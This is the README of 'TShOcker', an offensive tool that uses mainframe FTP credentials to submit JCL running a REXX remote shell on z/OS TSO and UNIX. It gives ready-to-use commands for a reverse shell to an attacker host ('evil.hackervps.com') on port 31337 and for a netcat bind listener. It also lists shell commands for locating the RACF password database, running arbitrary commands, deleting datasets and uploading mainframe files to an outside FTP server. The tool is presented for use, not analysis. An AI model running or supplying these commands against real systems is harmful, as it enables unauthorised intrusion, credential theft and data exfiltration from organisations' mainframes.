                      .-~*~--,.   .-.
              .-~-. ./OOOOOOOOO\.'OOO`9~~-.
            .`OOOOOO.OOM.OLSONOOOOO@@OOOOOO\
           /OOOO@@@OO@@@OO@@@OOO@@@@@@@@OOOO`.
           |OO@@@WWWW@@@@OOWWW@WWWW@@@@@@@OOOO).
         .-'OO@@@@WW@@@W@WWWWWWWWOOWW@@@@@OOOOOO}     
        /OOO@@O@@@@W@@@@@OOWWWWWOOWOO@@@OOO@@@OO|
       lOOO@@@OO@@@WWWWWWW\OWWWO\WWWOOOOOO@@@O.'
        \OOO@@@OOO@@@@@@OOW\|||||\WWWW@@@@@@@O'.
         `,OO@@@OOOOOOOOOOWW\|||||\WWWW@@@@@@OOO)
          \,O@@@@@OOOOOOWWWWW\|||||\WW@@@@@OOOO.'
            `~c~8~@@@@WWW@@W\|||||||\WOO|\UO-~'
                 (OWWWWWW@/\W\|||||||\WO)
                   `~-~''     \|||\WW=*'
                             __\|||\
                             \||||||\
                              \||||__\
              TShOcker         \||\
                                \|\
                                 \|\
                                  \\
                                   \\
                                    \
                                     \

TShOcker
========

A REXX script (CATSO) wrapped in JCL, enveloped in Python. CATSO is a rexx script meant to act like a mini command interpreter for TSO and UNIX but accessible through a simple netcat and/or any TCP bind (like metasploit). Using FTP (and JES mode) this script generates the necessary JCL needed to execute the rexx script in a temporary dataset. All you need to do is get a mainframe FTP username and password and you're good to go. 


Example
========

Reverse Connection
--------------------
Terminal 1: nc -l -p 31337

Terminal 2: ./TShOcker.py -r --rhost evil.hackervps.com --rport 31337 mainframe.ftp.corp.com jsmith dumbpass

Listener
--------
./TShOcker.py -l --lport 31337 mainframe.ftp.corp.com jsmith dumbpass
nc mainframe.ftp.corp.com 31337

Enter command or 'help'> help

Core Commands
=============

* help              Help Menu
* exit              Terminate the session
* quit              Terminate the session


Filesystem Commands
===================

* cat               Show contents of dataset
* cp                copies a file to a new file
* ls                list datasets in HLQ
* delete            deletes a file
* del               also deletes a file
* lsmem             Lists files and members
                     !!WARNING!! Takes time and IO


Networking Commands
===================

* ipconfig          Display interfaces
* ifconfig          Display interfaces


System Commands
===============

* getuid            Get current user name
* sysinfo           Remote system info (i.e OS)
* racf              Show password database location
* execute           Execute a TSO command
* tso               Execute TSO command (same as execute)
* unix              UNIX command (i.e ls -al)
* ftp               Upload a file from the mainframe to an FTP server. Syntax: host/ip user pass filename [binary]

